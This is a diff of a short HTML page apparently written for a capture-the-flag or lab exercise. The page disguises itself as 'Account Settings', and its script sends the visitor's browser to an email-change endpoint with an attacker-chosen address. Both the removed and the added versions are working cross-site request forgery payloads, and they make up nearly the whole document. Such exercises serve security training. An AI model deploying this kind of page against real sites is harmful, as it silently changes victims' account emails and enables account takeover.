@@ -5,14 +5,10 @@
     <title>Account Settings</title>
   </head>
   <body>
-    <p>Loading...</p>
-
+    <p>Getting flag...</p>
     <script>
-      const target = new URL("http://100.101.228.35:6009/settings/email");
-
-      target.searchParams.set("new", "tpas-csrf@example.org");
-
-      location.assign(target.href);
+      location.href =
+        "http://100.101.228.35:6009/settings/email?new=freshemail@example.com";
     </script>
   </body>
 </html>
